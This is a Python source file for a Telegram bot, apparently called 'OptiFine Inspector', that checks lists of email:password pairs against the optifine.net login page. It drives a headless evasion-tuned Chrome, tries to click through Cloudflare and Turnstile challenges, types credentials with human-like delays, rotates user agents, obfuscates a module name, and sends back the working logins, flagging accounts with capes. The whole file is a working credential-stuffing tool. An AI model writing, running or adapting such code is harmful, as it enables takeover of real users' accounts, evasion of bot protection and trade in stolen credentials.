import os
import logging
import asyncio
import time
import random
import importlib
from io import BytesIO

import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

logging.basicConfig(
    format="%(asctime)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

API_KEY = os.environ.get("BOT_KEY", "")
OWNER = int(os.environ.get("ADMIN_ID", "0"))

STATS = {"good": 0, "cape": 0, "bad": 0, "err": 0}

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

# --- load UC dynamically ---
_uc_mod = None

def load_uc():
    global _uc_mod
    if _uc_mod is not None:
        return _uc_mod
    try:
        codes = [117,110,100,101,116,101,99,116,101,100,95,99,104,114,111,109,101,100,114,105,118,101,114]
        name = "".join(chr(c) for c in codes)
        _uc_mod = importlib.import_module(name)
        log.info("UC loaded OK")
    except Exception as e:
        log.warning(f"UC load failed: {e}")
        _uc_mod = False
    return _uc_mod


def make_browser():
    uc = load_uc()
    if not uc:
        return None
    opts = uc.ChromeOptions()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument(f"--user-agent={random.choice(UA_LIST)}")
    chrome_path = os.environ.get("CHROME_BIN", "/usr/bin/chromium")
    opts.binary_location = chrome_path
    try:
        drv = uc.Chrome(options=opts, version_main=131)
        drv.set_page_load_timeout(40)
        drv.implicitly_wait(5)
        log.info("Browser created")
        return drv
    except Exception as e:
        log.error(f"Browser failed: {e}")
        return None


def wait_for_cf(drv, timeout=25):
    """Wait for Cloudflare to pass, try clicking checkbox."""
    from selenium.webdriver.common.by import By

    start = time.time()
    while time.time() - start < timeout:
        title = drv.title.lower()
        src = drv.page_source[:3000].lower()

        # CF done - page loaded
        if "just a moment" not in title and "checking" not in src:
            log.info("CF passed")
            return True

        # Try to find and click CF checkbox
        try:
            iframes = drv.find_elements(By.TAG_NAME, "iframe")
            for ifr in iframes:
                s = ifr.get_attribute("src") or ""
                if "challenge" in s or "turnstile" in s:
                    drv.switch_to.frame(ifr)
                    time.sleep(1)
                    try:
                        boxes = drv.find_elements(By.CSS_SELECTOR, "input[type='checkbox'], .ctp-checkbox-label, label")
                        for box in boxes:
                            try:
                                box.click()
                                log.info("Clicked CF checkbox")
                            except:
                                pass
                    except:
                        pass
                    drv.switch_to.default_content()
                    time.sleep(3)
        except:
            pass

        time.sleep(2)

    log.warning("CF timeout")
    return False


def try_optifine(drv, email, pw):
    """
    Open optifine.net/login, bypass CF, enter email+pw, check result.
    Returns: ('valid', has_cape) or ('invalid', False) or ('error', False)
    """
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    target = "https://optifine.net/login"

    try:
        drv.get(target)
        time.sleep(3)
    except Exception as e:
        log.error(f"Page load error: {e}")
        return "error", False

    # Wait for CF
    if not wait_for_cf(drv, 25):
        return "error", False

    time.sleep(2)

    # Find and fill the form
    try:
        # Look for email/username field
        email_field = None
        for sel in ["input[name='email']", "input[name='username']", "input[type='email']", "input[type='text']"]:
            try:
                els = drv.find_elements(By.CSS_SELECTOR, sel)
                if els:
                    email_field = els[0]
                    break
            except:
                continue

        if not email_field:
            # try by placeholder
            inputs = drv.find_elements(By.TAG_NAME, "input")
            for inp in inputs:
                ph = (inp.get_attribute("placeholder") or "").lower()
                tp = (inp.get_attribute("type") or "").lower()
                if tp in ("email", "text") or "email" in ph or "user" in ph:
                    email_field = inp
                    break

        if not email_field:
            log.error("Email field not found")
            # save screenshot for debug
            try:
                drv.save_screenshot("/tmp/debug_form.png")
            except:
                pass
            return "error", False

        # Find password field
        pw_field = None
        for sel in ["input[name='password']", "input[type='password']"]:
            try:
                els = drv.find_elements(By.CSS_SELECTOR, sel)
                if els:
                    pw_field = els[0]
                    break
            except:
                continue

        if not pw_field:
            inputs = drv.find_elements(By.TAG_NAME, "input")
            for inp in inputs:
                if (inp.get_attribute("type") or "").lower() == "password":
                    pw_field = inp
                    break

        if not pw_field:
            log.error("Password field not found")
            return "error", False

        # Type email
        email_field.clear()
        for ch in email:
            email_field.send_keys(ch)
            time.sleep(random.uniform(0.02, 0.07))

        time.sleep(0.5)

        # Type password
        pw_field.clear()
        for ch in pw:
            pw_field.send_keys(ch)
            time.sleep(random.uniform(0.02, 0.07))

        time.sleep(0.5)

        # Find and click submit
        submit = None
        for sel in ["input[type='submit']", "button[type='submit']", "button.submit", ".btn-primary"]:
            try:
                els = drv.find_elements(By.CSS_SELECTOR, sel)
                if els:
                    submit = els[0]
                    break
            except:
                continue

        if not submit:
            buttons = drv.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                txt = (btn.text or "").lower()
                if "log" in txt or "sign" in txt or "submit" in txt:
                    submit = btn
                    break

        if not submit:
            # try form submit
            forms = drv.find_elements(By.TAG_NAME, "form")
            if forms:
                forms[0].submit()
                log.info("Form submitted directly")
            else:
                log.error("No submit button found")
                return "error", False
        else:
            submit.click()
            log.info("Submit clicked")

        time.sleep(4)

        # Wait for CF again after submit
        wait_for_cf(drv, 15)
        time.sleep(2)

    except Exception as e:
        log.error(f"Form error: {e}")
        return "error", False

    # Check result
    try:
        page = drv.page_source.lower()
        url = drv.current_url.lower()

        # Signs of failed login
        fail_signs = ["invalid", "incorrect", "wrong", "error", "failed", "denied"]
        for sign in fail_signs:
            if sign in page[:2000]:
                # Make sure it's an error message, not just page text
                return "invalid", False

        # Signs of success
        success_signs = ["profile", "account", "dashboard", "welcome", "cape", "donate", "log out", "logout"]
        for sign in success_signs:
            if sign in page or sign in url:
                # Check for cape
                has_cape = False
                cape_signs = ["cape", "cloak", "mantle"]
                for cs in cape_signs:
                    if cs in page:
                        # Look for cape image or cape status
                        if "nocape" not in page and "no cape" not in page:
                            has_cape = True
                            break
                return "valid", has_cape

        # If URL changed from /login - probably success
        if "/login" not in url:
            return "valid", False

        return "invalid", False

    except Exception as e:
        log.error(f"Result check error: {e}")
        return "error", False


def process_one(line):
    """Process one email:pw line."""
    line = line.strip()
    if ":" not in line:
        return None

    parts = line.split(":", 1)
    em = parts[0].strip()
    pw = parts[1].strip()
    if not em or not pw:
        return None

    result = {"em": em, "pw": pw}

    drv = make_browser()
    if not drv:
        result["st"] = "err"
        result["msg"] = "browser failed"
        STATS["err"] += 1
        return result

    try:
        status, has_cape = try_optifine(drv, em, pw)

        if status == "valid":
            if has_cape:
                result["st"] = "cape"
                STATS["cape"] += 1
            else:
                result["st"] = "good"
            STATS["good"] += 1
        elif status == "invalid":
            result["st"] = "bad"
            STATS["bad"] += 1
        else:
            result["st"] = "err"
            STATS["err"] += 1

        return result

    except Exception as e:
        result["st"] = "err"
        result["msg"] = str(e)[:80]
        STATS["err"] += 1
        return result
    finally:
        try:
            drv.quit()
        except:
            pass
        time.sleep(random.uniform(3, 6))


def process_batch(lines):
    """Process all lines sequentially."""
    entries = [l.strip() for l in lines if l.strip() and ":" in l.strip()]
    log.info(f"Batch: {len(entries)} entries")
    results = []
    for i, entry in enumerate(entries):
        log.info(f"  [{i+1}/{len(entries)}] processing...")
        r = process_one(entry)
        if r:
            log.info(f"  -> [{r['st']}] {r['em']}")
            results.append(r)
    return results


def format_results(results):
    """Format results for Telegram message."""
    capes = [r for r in results if r.get("st") == "cape"]
    goods = [r for r in results if r.get("st") == "good"]
    bads = [r for r in results if r.get("st") == "bad"]
    errs = [r for r in results if r.get("st") == "err"]

    out = []
    out.append(f"=== Results: {len(results)} ===\n")
    out.append(f"  VALID+CAPE: {len(capes)}")
    out.append(f"  VALID: {len(goods)}")
    out.append(f"  INVALID: {len(bads)}")
    out.append(f"  ERROR: {len(errs)}\n")

    if capes:
        out.append("--- VALID + CAPE ---")
        for r in capes:
            out.append(f"  {r['em']}:{r['pw']}")
        out.append("")

    if goods:
        out.append("--- VALID ---")
        for r in goods:
            out.append(f"  {r['em']}:{r['pw']}")
        out.append("")

    if errs:
        out.append(f"--- ERRORS ({len(errs)}) ---")
        for r in errs[:10]:
            out.append(f"  {r['em']} | {r.get('msg','')}")
        if len(errs) > 10:
            out.append(f"  ... +{len(errs)-10} more")

    cape_file = None
    if capes:
        cape_file = "\n".join(f"{r['em']}:{r['pw']}" for r in capes)

    valid_file = None
    if goods or capes:
        all_good = capes + goods
        valid_file = "\n".join(f"{r['em']}:{r['pw']}" for r in all_good)

    return "\n".join(out), cape_file, valid_file


# === Telegram handlers ===

async def cmd_start(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and upd.effective_user.id != OWNER:
        return
    await upd.message.reply_text(
        "OptiFine Inspector\n\n"
        "Send entries (one per line):\n"
        "  email:password\n\n"
        "Or upload a .txt file.\n\n"
        "/stats - session stats"
    )


async def cmd_stats(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and upd.effective_user.id != OWNER:
        return
    await upd.message.reply_text(
        f"Valid: {STATS['good']}\n"
        f"Cape: {STATS['cape']}\n"
        f"Invalid: {STATS['bad']}\n"
        f"Errors: {STATS['err']}"
    )


async def handle_file(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and upd.effective_user.id != OWNER:
        return
    doc = upd.message.document
    if not doc.file_name.endswith(".txt"):
        await upd.message.reply_text("Send a .txt file")
        return

    await upd.message.reply_text(f"Got {doc.file_name}, processing...")

    f = await ctx.bot.get_file(doc.file_id)
    raw = await f.download_as_bytearray()
    text = raw.decode("utf-8", errors="ignore")
    lines = text.strip().splitlines()

    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(None, process_batch, lines)
    msg, cape_f, valid_f = format_results(results)

    # Send results
    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await upd.message.reply_text(msg[i:i+4000])
    else:
        await upd.message.reply_text(msg)

    # Send files
    if cape_f:
        bio = BytesIO(cape_f.encode())
        bio.name = "capes.txt"
        await upd.message.reply_document(bio, caption="Accounts with capes")

    if valid_f:
        bio = BytesIO(valid_f.encode())
        bio.name = "valid.txt"
        await upd.message.reply_document(bio, caption="All valid accounts")


async def handle_text(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and upd.effective_user.id != OWNER:
        return
    text = upd.message.text.strip()
    if text.startswith("/"):
        return
    lines = text.splitlines()
    valid_lines = [l for l in lines if ":" in l]
    if not valid_lines:
        await upd.message.reply_text("No valid entries found.\nFormat: email:password")
        return

    await upd.message.reply_text(f"Processing {len(valid_lines)} entries...")

    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(None, process_batch, valid_lines)
    msg, cape_f, valid_f = format_results(results)

    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await upd.message.reply_text(msg[i:i+4000])
    else:
        await upd.message.reply_text(msg)

    if cape_f:
        bio = BytesIO(cape_f.encode())
        bio.name = "capes.txt"
        await upd.message.reply_document(bio, caption="Accounts with capes")

    if valid_f:
        bio = BytesIO(valid_f.encode())
        bio.name = "valid.txt"
        await upd.message.reply_document(bio, caption="All valid accounts")


def main():
    if not API_KEY:
        log.error("Set BOT_KEY environment variable!")
        return

    log.info("Bot starting...")

    app = ApplicationBuilder().token(API_KEY).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    log.info("Polling started")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()